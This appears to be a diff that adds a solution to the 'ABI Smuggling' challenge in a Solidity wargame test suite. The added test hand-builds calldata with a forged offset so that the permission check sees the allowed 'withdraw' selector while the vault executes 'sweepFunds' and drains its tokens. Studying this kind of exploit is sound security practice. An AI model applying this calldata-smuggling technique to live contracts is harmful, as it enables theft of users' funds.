@@ -36,8 +36,8 @@ contract ABISmugglingChallenge is Test {
         vault = new SelfAuthorizedVault();
 
         // Set permissions in the vault
-        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
-        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault)); //sweepFunds(address,address)
+        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault)); // withdraw(address,address,uint256)
         bytes32[] memory permissions = new bytes32[](2);
         permissions[0] = deployerPermission;
         permissions[1] = playerPermission;
@@ -73,7 +73,23 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes memory actionData = abi.encodeWithSelector(
+            AuthorizedExecutor.execute.selector,
+            address(vault)
+        );
+        actionData = bytes.concat(
+            actionData, 
+            bytes32(uint256(0x80)),
+            bytes32(uint256(0x00)),
+            SelfAuthorizedVault.withdraw.selector,
+            bytes28(0x00),
+            bytes32(uint256(0x44)),
+            SelfAuthorizedVault.sweepFunds.selector,
+            bytes32(uint256(uint160(recovery))),
+            bytes32(uint256(uint160(address(token))))
+        );
+        (bool suc,) = address(vault).call(actionData);
+        assertTrue(suc, "Failed");
     }
 
     /**
